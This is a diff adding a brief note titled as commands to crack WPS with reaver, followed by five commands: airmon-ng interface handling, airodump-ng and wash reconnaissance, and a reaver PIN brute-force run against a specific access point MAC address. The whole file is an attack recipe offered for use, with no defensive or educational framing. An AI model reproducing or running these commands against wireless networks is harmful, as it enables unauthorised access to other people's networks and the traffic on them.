@@ -1,0 +1,6 @@
+The following commands are used to crack WPS with reaver
+airmon-ng
+airmon-ng stop wlan1
+airodump-ng wlan1
+wash -i wlan1 -c 6 -C -s
+reaver -i wlan1 -b C8:D7:19:74:A1:F5 --fail-wait=360
